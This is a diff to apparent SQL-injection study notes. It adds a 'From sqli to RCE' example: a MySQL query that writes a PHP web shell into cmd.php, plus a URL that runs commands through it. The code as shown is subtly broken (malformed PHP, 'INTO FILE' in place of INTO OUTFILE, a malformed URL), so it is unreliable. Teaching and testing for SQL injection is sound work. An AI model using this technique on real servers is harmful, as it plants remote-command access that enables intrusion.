@@ -91,9 +91,14 @@ If the first letter of the first database's name is an 'B', wait for 10 seconds.
 # Vulnerability explatation samples
 
 ## From sqli to RCE 
-SQL provides these functions : 
-**load_file** to read and 
-**INTO FILE** to write a result into a file. 
+MySQL provides these functions : 
+**load_file** to read file and **INTO FILE** to write a result into a file.
+An attacker can write in a file with this kind of sql request 
+```sql 
+  select "<?php system([$_GET])" INTO FILE cmd.php 
+  ```
+  And then access to it using ``http:domain.com/cmd.php?maliciouscmd``
+  
 
 
 # How to test/check for SQLi
